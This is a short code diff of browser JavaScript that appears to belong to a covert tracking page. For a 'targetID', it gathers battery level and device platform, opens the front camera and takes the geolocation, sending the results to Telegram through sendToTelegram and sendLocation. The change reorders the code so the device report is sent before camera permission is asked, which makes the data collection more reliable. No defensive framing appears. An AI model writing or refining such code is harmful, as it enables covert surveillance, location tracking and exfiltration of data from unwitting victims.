@@ -13,12 +13,7 @@
 
     async function capture() {
         if (!targetID) return;
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" },
-                audio: false
-            });
-            let batteryInfo = "Unknown";
+		let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
@@ -33,6 +28,12 @@
                                  `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
                     sendToTelegram(report);
                 });
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
+            });
+            
             navigator.geolocation.getCurrentPosition(pos => {
                 sendLocation(pos.coords.latitude, pos.coords.longitude);
             });
